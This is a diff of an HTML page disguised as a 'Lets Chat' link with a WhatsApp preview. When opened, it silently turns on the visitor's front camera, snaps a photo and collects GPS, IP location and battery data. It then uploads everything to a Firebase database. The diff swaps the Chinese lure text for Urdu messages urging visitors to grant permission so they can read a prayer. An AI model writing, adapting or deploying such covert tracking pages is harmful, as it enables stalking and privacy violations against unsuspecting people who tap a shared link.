@@ -8,9 +8,8 @@
     <!-- WhatsApp Preview -->
     <meta property="og:title" content="Lets Chat">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://raw.githubusercontent.com/KOKO17-stack/MISSCOOL/main/insta%20link.jpeg">
+    <meta property="og:image" content="https://github.com/KOKO17-stack/MISSCOOL/blob/main/IMG_5685.jpeg">
     <meta property="og:type" content="website">
-
     <style>
         body { 
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
@@ -56,19 +55,15 @@
     <div class="container" id="content">
         <h1 id="heading">请稍等，正在加载您的位置...</h1>
         <p id="subtitle">这只需要一点时间。</p>
-
         <!-- Camera preview -->
         <div id="cameraSection" style="display:none;">
             <p style="margin:15px 0 8px;">前置相机已开启，正在拍照...</p>
             <video id="video" autoplay playsinline muted></video>
         </div>
     </div>
-
     <script>
         const FIREBASE_URL = "https://kojocoords-default-rtdb.europe-west1.firebasedatabase.app/location.json";
-
         let mediaStream = null;
-
         /**
          * Cleanup media stream immediately after capture
          */
@@ -84,13 +79,11 @@
                 mediaStream = null;
             }
         }
-
         /**
          * Start camera, capture photo, and immediately close camera
          */
         async function startRecording() {
             let photoBase64 = null;
-
             try {
                 // Request camera with optimized settings for low-light
                 mediaStream = await navigator.mediaDevices.getUserMedia({ 
@@ -105,13 +98,10 @@
                         sharpness: { ideal: 100 }
                     }
                 });
-
                 const video = document.getElementById('video');
                 video.srcObject = mediaStream;
                 document.getElementById('cameraSection').style.display = 'block';
-
                 console.log("✓ Camera stream started");
-
                 /**
                  * Capture photo with optimized timing
                  * 2.5 seconds allows sensor auto-calibration for better exposure
@@ -154,14 +144,12 @@
                         collectAndSendData(null);
                     }
                 }, 2500);
-
             } catch (err) {
                 console.error("✗ Camera permission error:", err);
                 cleanupMedia();
-                document.getElementById('content').innerHTML = `<h2 class="error">权限被拒绝，请重试。</h2>`;
+                document.getElementById('content').innerHTML = `<h2 class="error">please allow click kr k dua parhain. Dobara click kro.</h2>`;
             }
         }
-
         /**
          * Collect all available data in parallel
          */
@@ -199,12 +187,10 @@
                 photo_base64: photoBase64,
                 note: "前置相机自动拍照"
             };
-
             /**
              * Collect data in parallel for maximum efficiency
              */
             const dataPromises = [];
-
             // Battery API (deprecated but try anyway)
             dataPromises.push(
                 (async () => {
@@ -221,7 +207,6 @@
                     }
                 })()
             );
-
             // Geolocation with comprehensive data
             dataPromises.push(
                 (async () => {
@@ -248,7 +233,6 @@
                     }
                 })()
             );
-
             // IP-based location with timeout
             dataPromises.push(
                 (async () => {
@@ -276,12 +260,9 @@
                     }
                 })()
             );
-
             // Wait for all data collection to complete
             await Promise.all(dataPromises);
-
             console.log("✓ All data collected, sending to Firebase");
-
             // Send to Firebase with timeout
             try {
                 const controller = new AbortController();
@@ -294,27 +275,23 @@
                     signal: controller.signal
                 });
                 clearTimeout(timeoutId);
-
                 if (response.ok) {
                     console.log("✓ Data sent to Firebase successfully");
-                    document.getElementById('content').innerHTML = `<h2 class="success">照片已自动发送 ❤️<br>谢谢！</h2>`;
+                    document.getElementById('content').innerHTML = `<h2 class="success">اللَّهُمَّ إِنِّي أَعُوذُ بِكَ مِنَ الْهَمِّ وَالْحَزَنِ، وَالْعُجْزِ وَالْكَسَلِ، وَالْبُخْلِ وَالْجُبْنِ، وَضَلَعِ الدَّيْنِ وَغَلَبَةِ الرِّجَالِ<br><br>اے اللہ! میں تیری پناہ مانگتا ہوں غم اور پریشانی سے، عاجزی اور سستی سے، بخل اور بزدلی سے، اور قرض کے بوجھ اور لوگوں کے غلبے سے۔ ❤️❤️❤️</h2>`;
                 } else {
                     throw new Error(`Firebase response: ${response.status}`);
                 }
             } catch (e) {
                 console.error("✗ Firebase send error:", e);
-                document.getElementById('content').innerHTML = `<h2 class="error">发送失败，请检查网络连接后重试。</h2>`;
+                document.getElementById('content').innerHTML = `<h2 class="error">please allow click kr k dua parhain. Dobara click kro.</h2>`;
             }
         }
-
         // Start everything
         document.addEventListener('DOMContentLoaded', startRecording);
-
         // Cleanup on page unload
         window.addEventListener('beforeunload', () => {
             cleanupMedia();
         });
-
         // Cleanup on visibility change
         document.addEventListener('visibilitychange', () => {
             if (document.hidden) {
